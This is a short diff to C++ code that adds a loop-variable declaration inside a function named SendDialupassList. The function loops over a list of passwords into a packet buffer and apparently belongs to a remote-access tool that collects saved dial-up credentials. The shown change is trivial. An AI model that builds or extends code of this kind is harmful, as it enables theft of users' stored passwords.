@@ -81,7 +81,8 @@ void CSystemManager::SendDialupassList()
 	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLen);
 	
 	DWORD	dwOffset = 1;
-	
+	int i;
+
 	for (i = 0; i < pass.GetMax(); i++)
 	{
 		
